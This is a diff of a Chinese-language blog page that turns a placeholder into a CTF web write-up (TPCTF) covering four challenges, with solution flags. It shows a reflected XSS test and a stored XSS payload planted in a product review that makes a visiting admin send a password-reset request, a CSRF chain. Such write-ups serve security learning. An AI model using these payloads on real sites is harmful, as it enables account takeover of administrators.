@@ -66,7 +66,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
 
 
-  <meta name="keywords" content="pupiles, CTF">
+  <meta name="keywords" content="ctf writeup">
 
 
 
@@ -82,17 +82,27 @@
 
 
 
-<meta name="description" content="google-site-verification: google1bcf481140594d70.html">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Pupiles blog">
-<meta property="og:url" content="http://pupiles.com/google1bcf481140594d70.html">
+<meta name="description" content="ad这题巨坑提示说从本站找，翻了翻功能，发现一个/about页面，然而并没有啥东西，后来根据题目ad脑洞把火狐的adblock关了，得到flag1tpctf&amp;#123;thx_4_n0_adb1ock&amp;#125; method这题也入坑了好久题目说要找到一个使服务器产生问题的page，就可以得到flag访问problem提示说flag不在这里结果试了各种爆错和扫描器，最后冷静下看题目提示是meth">
+<meta name="keywords" content="ctf writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TPCTF-WEBwriteup">
+<meta property="og:url" content="http://pupiles.com/tpctfwp.html">
 <meta property="og:site_name" content="Pupiles blog">
-<meta property="og:description" content="google-site-verification: google1bcf481140594d70.html">
+<meta property="og:description" content="ad这题巨坑提示说从本站找，翻了翻功能，发现一个/about页面，然而并没有啥东西，后来根据题目ad脑洞把火狐的adblock关了，得到flag1tpctf&amp;#123;thx_4_n0_adb1ock&amp;#125; method这题也入坑了好久题目说要找到一个使服务器产生问题的page，就可以得到flag访问problem提示说flag不在这里结果试了各种爆错和扫描器，最后冷静下看题目提示是meth">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2017-06-03T01:06:34.000Z">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf1.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf2.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf3.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/%E6%8D%95%E8%8E%B74.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf5.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/%E6%8D%95%E8%8E%B76.PNG">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/%E6%8D%95%E8%8E%B77.PNG">
+<meta property="og:updated_time" content="2018-11-15T04:55:36.103Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Pupiles blog">
-<meta name="twitter:description" content="google-site-verification: google1bcf481140594d70.html">
+<meta name="twitter:title" content="TPCTF-WEBwriteup">
+<meta name="twitter:description" content="ad这题巨坑提示说从本站找，翻了翻功能，发现一个/about页面，然而并没有啥东西，后来根据题目ad脑洞把火狐的adblock关了，得到flag1tpctf&amp;#123;thx_4_n0_adb1ock&amp;#125; method这题也入坑了好久题目说要找到一个使服务器产生问题的page，就可以得到flag访问problem提示说flag不在这里结果试了各种爆错和扫描器，最后冷静下看题目提示是meth">
+<meta name="twitter:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf.PNG">
 
 
 
@@ -120,19 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://pupiles.com/google1bcf481140594d70.html">
+  <link rel="canonical" href="http://pupiles.com/tpctfwp.html">
 
 
 
 
 
-  <title>
-  
-
-  
-     | Pupiles blog
-  
-</title>
+  <title> TPCTF-WEBwriteup | Pupiles blog </title>
 </head>
 <body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
 
@@ -166,7 +170,7 @@
     
   
 
-  <div class="container sidebar-position-left  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -309,18 +313,232 @@
             
 
   <div id="posts" class="posts-expand">
-  <header class="post-header">
+    
 
-	<h2 class="post-title" itemprop="name headline"></h2>
+  
 
+  
+  
+  
 
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://pupiles.com/tpctfwp.html">
 
-</header>
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pupil">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pupiles blog">
+    </span>
 
     
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                TPCTF-WEBwriteup
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-04T13:56:22+08:00">
+                2017-12-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/tpctfwp.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/tpctfwp.html" class="leancloud_visitors" data-flag-title="TPCTF-WEBwriteup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
     
-      google-site-verification: google1bcf481140594d70.html
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="ad"><a href="#ad" class="headerlink" title="ad"></a>ad</h2><p>这题巨坑<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf.PNG" alt=""><br>提示说从本站找，翻了翻功能，发现一个/about页面，然而并没有啥东西，后来根据题目<code>ad</code>脑洞把火狐的adblock关了，得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpctf&#123;thx_4_n0_adb1ock&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="method"><a href="#method" class="headerlink" title="method"></a>method</h2><p>这题也入坑了好久<br>题目说要找到一个使服务器产生问题的<code>page</code>，就可以得到flag<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf1.PNG" alt=""><br>访问problem提示说flag不在这里<br>结果试了各种爆错和扫描器，最后冷静下看题目提示是method于是试了一遍methos<br><code>get</code>,<code>post</code>,<code>put</code>,<code>options</code>,<code>delete</code><br>在delete的时候发现了flag<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf2.PNG" alt=""><br>3.What is this place?<br>一打开是个这样的页面<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf3.PNG" alt=""><br>根据提示加一句话<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">window</span>.location)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/%E6%8D%95%E8%8E%B74.PNG" alt=""><br>再根据提示截取前16个字符访问得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tpctf&#123;w4i7_r3pl_d03s_7h15?&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Management"><a href="#Management" class="headerlink" title="Management"></a>Management</h2><p>打开是个注册页面，注册一个<code>pupiles</code>用户后进入，进入后逻辑大概是这样的<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/tpctf5.PNG" alt=""><br>create会把数字和value一起插入到数据库，read会把相应的sql语句和返回结果(上一步的value)打印出来。<br>这里本来以为是二次注入，没想到随手一试直接出了flag…(迷<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/%E6%8D%95%E8%8E%B76.PNG" alt="">    </p>
+<h2 id="It’s-Common-Sense"><a href="#It’s-Common-Sense" class="headerlink" title="It’s Common Sense"></a>It’s Common Sense</h2><p>进去给了一个站，浏览了一下大概有如下几个功能</p>
+<ol>
+<li>重置密码，会给你输入的邮箱发送一封重置密码的邮件</li>
+<li>提交产品评论<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/%E6%8D%95%E8%8E%B77.PNG" alt=""><br>看到这里，大概明白了如何下手了，csrf+重置管理员密码<br>在产品评论处提交xsspayload<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> payload = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">payload.open(<span class="string">"POST"</span>, <span class="string">"https://commonsensereviews.tpctf.tk/account"</span>, <span class="literal">false</span>);</span><br><span class="line">payload.setRequestHeader(<span class="string">'Content-Type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">payload.send(<span class="string">"email=你的邮箱地址&amp;formbtn=Send+Request"</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这样就可以收到邮件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Reset Your Password</span><br><span class="line"></span><br><span class="line">Congratulations! Normally, you would&apos;ve reset the administrators password.</span><br><span class="line">For the purposes of this challenge,</span><br><span class="line">the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
     
+     <div>    
+      
+      <ul class="post-copyright">
+         <li class="post-copyright-link">
+          <strong>本文作者：</strong>
+          <a href="/" title="欢迎访问 Pupil 的个人博客">Pupil</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文标题：</strong>
+          <a href="http://pupiles.com/tpctfwp.html" title="TPCTF-WEBwriteup">TPCTF-WEBwriteup</a>
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="http://pupiles.com/tpctfwp.html" title="TPCTF-WEBwriteup">http://pupiles.com/tpctfwp.html</a>
+        </li>
+        <li class="post-copyright-date">
+            <strong>发布时间：</strong>2017年12月4日 - 13时12分
+        </li>  
+        <li class="post-copyright-license">
+          <strong>版权声明： </strong>
+          本文由 Pupil 原创，采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="license" target="_blank">保留署名-非商业性使用-禁止演绎 4.0-国际许可协议</a> <br>转载请保留以上声明信息！
+        </li>
+      </ul>
+    
+  </div>
+
+    <footer class="post-footer">
+		   
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/谈谈parse_url.html" rel="next" title="parse_url的小trick">
+                <i class="fa fa-chevron-left"></i> parse_url的小trick
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/secconctf.html" rel="prev" title="secconctf-writeup">
+                secconctf-writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -356,8 +574,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image" src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/touxiang.jpg" alt="Pupil">
           <p class="site-author-name" itemprop="name">Pupil</p>
@@ -428,6 +655,22 @@
 
       </p></div></section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ad"><span class="nav-number">1.</span> <span class="nav-text">ad</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#method"><span class="nav-number">2.</span> <span class="nav-text">method</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Management"><span class="nav-number">3.</span> <span class="nav-text">Management</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#It’s-Common-Sense"><span class="nav-number">4.</span> <span class="nav-text">It’s Common Sense</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -538,6 +781,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
 
   
 
